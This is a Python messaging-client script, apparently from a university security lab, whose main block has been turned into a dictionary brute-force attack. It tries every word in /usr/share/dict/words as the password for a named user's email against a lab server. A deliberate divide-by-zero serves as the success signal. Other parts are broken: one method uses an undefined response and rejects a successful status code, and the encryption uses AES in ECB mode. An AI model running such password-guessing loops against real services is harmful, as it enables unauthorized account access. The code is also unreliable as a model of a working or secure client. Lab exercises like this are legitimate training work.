from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from json import dumps, loads
from requests import post as post_request
from socket import socket, AF_INET, SOCK_STREAM
import time

class Sender:
    def __init__(self, server, username, password):
        """
        Args:
            server (str) - the server url
            username (str) - the login username
            password (str) - the login password
        """

        self.server = server
        self.username = username
        self.token = self.get_login_token(password)

    def get_login_token(self, password):
        """Connect with the server, provide correct username and password, and
        obtain the login token.

        Args:
            password (str) - the login password

        Returns:
            A login token for future operations
        """

        server = self.server + '/login'
        data = dumps({'username': self.username, 'password': password})

        response = post_request(server, data=data)

        
        if response.status_code == 200:
            yes = 5/0

        #return loads(response.content)['token']

    def get_receiver_info(self, receiver):
        """Connect with the server, provide correct username and token, and
        receive information related to messaging a receiver.

        Args:
            receiver (str) - the receiver username

        Returns:
            A JSON object containing the following keys.
                receiver: the receiver username
                ip_addr: the receiver IP address
                secret: secret key to connect with receiver
                senderinfo: encrypted packet with sender information
        """

        server = self.server + '/userinfo'
        data = dumps({'username': self.username, 'token': self.token,
                      'receiver': receiver})

        if response.status_code == 200:
            raise Exception('Unexpected response code from the server.')

        return loads(response.content)

    def send_message(self, receiver, message):
        """Send a confidential message to the receiver.

        Args:
            receiver (str) - the receiver username
            message (str) - the confidential message
        """

        # convert message to bytes and pad to 16.
        message = pad(str.encode(message), 16)

        receiver_info = self.get_receiver_info(receiver)
        ip_addr = receiver_info['ip_addr']
        port = 9999
        secret_key = receiver_info['secret']
        sender_info = receiver_info['senderinfo']

        # prepare the message by encrypting it using the shared secret.
        # without the senderinfo packet, there is no way for receiver
        # to decrypt the message so transmit that as well.
        cipher = AES.new(str.encode(secret_key), AES.MODE_ECB)
        tx_message = dumps({'msgtype': 'chat',
                            'message': cipher.encrypt(message).hex(),
                            'senderinfo': sender_info})

        sock = socket(AF_INET, SOCK_STREAM)
        sock.connect((ip_addr, port))
        sock.send(str.encode(tx_message))
        print(f'Message Status: {sock.recv(32).decode()}')
        sock.close()


if __name__ == '__main__':
    # Update username with your email address (all lowercase)
    # Update receiver with receiver email address (all lowercase)
    with  open("/usr/share/dict/words", "r") as file:
        for line in file:
            sender = Sender(server='http://192.168.0.172:8888',
                        username='sashank_narain@uml.edu',
                        password=line.strip())
                
            
    #sender.send_message(receiver='<recv email address>', message='Hello')
